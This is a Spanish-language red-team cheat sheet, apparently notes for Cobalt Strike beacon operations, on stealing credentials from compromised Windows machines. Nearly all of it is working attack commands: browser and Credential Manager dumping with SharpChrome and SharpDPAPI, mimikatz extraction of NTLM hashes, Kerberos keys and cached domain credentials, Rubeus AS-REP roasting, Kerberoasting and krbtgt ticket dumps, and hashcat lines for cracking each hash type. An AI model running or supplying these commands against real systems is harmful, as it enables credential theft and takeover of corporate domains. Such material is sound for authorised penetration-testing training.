## 🗝️ **EXTRACCIÓN DE CREDENCIALES DESDE NAVEGADORES WEB**

- Requiere *Medium Level Beacon*

```powershell
beacon> execute-assembly C:\Tools\SharpDPAPI\SharpChrome\bin\Release\SharpChrome.exe logins
```


## 🛡️ **EXTRACCIÓN DE CREDENCIALES: WINDOWS CREDENTIAL MANAGER**

- Requiere *Medium Level Beacon*, y acceso a la cuenta del usuario que queremos sacar las credenciales.

>Enumeramos si hay credenciales guardadas
```powershell
beacon> run vaultcmd /listcreds:"Windows Credentials" /all
```

>Desciframos con *SharpDPAPI*
```powershell
beacon> execute-assembly C:\Tools\SharpDPAPI\SharpDPAPI\bin\Release\SharpDPAPI.exe credentials /rpc
```


## 🧠 **EXTRAER CREDS DEL OS**

> Sacar el **NTLM** -> Pass The Hash
> Debes tener high beacon y luego usar el **! para suplantar el ID de SYSTEM**

```powershell
beacon> mimikatz sekurlsa::logonpasswords
```

 ```powershell
 PS C:\Tools\hashcat> .\hashcat.exe -a 0 -m 1000 .\ntlm.hash .\example.dict -r .\rules\dive.rule
```


> Sacar **AES256 kerberos KEY** -> el des_cbc_md4 mas largo.

```powershell
beacon> mimikatz sekurlsa::ekeys
```

```powershell
PS C:\Tools\hashcat> .\hashcat.exe -a 0 -m 28900 .\sha256.hash .\example.dict -r .\rules\dive.rule
```

## 📦 **CREDENCIALES ALMACENADAS EN EL CACHE DEL DOMINIO**

```powershell
beacon> mimikatz !lsadump::cache
```

```powershell
PS C:\Tools\hashcat> .\hashcat.exe -a 0 -m 2100 .\mscachev2.hash .\example.dict -r .\rules\dive.rule
```

## 🔥 **KERBEROS TICKETS**

**AS-REP Roasting**

> Buscar cuentas

```powershell
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asreproast /format:hashcat /nowrap
```

```powershell
PS C:\Tools\hashcat> .\hashcat.exe -a 0 -m 18200 .\asrep.hash .\example.dict -r .\rules\dive.rule
```

**Kerberoasting**

> Buscar cuentas

```powershell
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe kerberoast /format:hashcat /simple
```

```powershell
PS C:\Tools\hashcat> .\hashcat.exe -a 0 -m 13100 .\kerb.hash .\example.dict -r .\rules\dive.rule
```


**Extraer  Tickets**

>Debes tener *High Level integrity*
```powershell
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage


beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x35b1d /service:krbtgt /nowrap
```

